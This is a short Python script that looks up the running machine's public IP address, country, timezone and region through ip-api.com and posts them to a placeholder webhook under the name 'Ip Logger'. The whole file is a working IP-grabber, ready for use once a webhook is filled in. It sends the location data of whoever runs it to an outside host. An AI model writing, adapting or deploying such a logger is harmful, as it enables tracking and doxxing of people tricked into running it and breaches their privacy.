h00k = "YOUR WEBHOOK HEEREERERE"
url = "http://ip-api.com/json/?fields=225545"
import requests


x = requests.get(url).json()





data = {
    
    "username": "Ip Logger😂♣",
    "content": f"""
    @everyone
    **Ip:** {x["query"]}
    **Country:** {x["country"]}
    **TimeZone:** {x["timezone"]}
    **Region:** {x["regionName"]}
    @everyone
    
    """
    
    
    
}

requests.post(h00k,json=data)